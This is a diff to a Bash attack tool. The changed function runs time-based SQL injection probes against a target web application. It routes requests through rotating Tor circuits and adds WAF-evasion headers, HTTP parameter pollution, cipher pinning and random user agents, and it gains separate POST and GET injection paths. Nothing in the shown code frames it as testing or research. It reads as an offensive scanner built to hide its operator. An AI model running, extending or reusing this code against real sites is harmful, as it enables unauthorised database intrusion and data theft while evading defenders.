@@ -226,7 +226,9 @@ fi
       }
       vector_sqli_agressor_right() {
         while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
-          [[ -z "$default_path" ]] && continue
+          if [[ "$default_path" == "/" ]]; then
+  default_path=""
+fi
 
           local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
             local proxy_flag=""
@@ -285,12 +287,24 @@ fi
 
             echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
 
-          curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
-            curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
-            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-            -m 12 -A "$random_ua" -s -o /dev/null -d @- \
-            -w "%{time_total}|%{http_code}" \
-            "${target_url}${default_path}" "${target_url}${default_path}")
+          if [ "$REQ_METHOD" = "POST" ]; then
+            
+            echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [POST][PORT:$random_port] Target Param: $TARGET_PARAM"
+            curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
+              curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
+              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+              -w "%{time_total}|%{http_code}" \
+              "${target_url}${default_path}")
+          else
+            echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [GET][PORT:$random_port] Target URL: ${target_url}${default_path}?${TARGET_PARAM}=${defiance_tamper_path}"
+
+            curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
+              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+              -m 12 -A "$random_ua" -s -o /dev/null \
+              -w "%{time_total}|%{http_code}" \
+              "${target_url}${default_path}?${TARGET_PARAM}=${defiance_tamper_path}")
+          fi
             local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
             local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
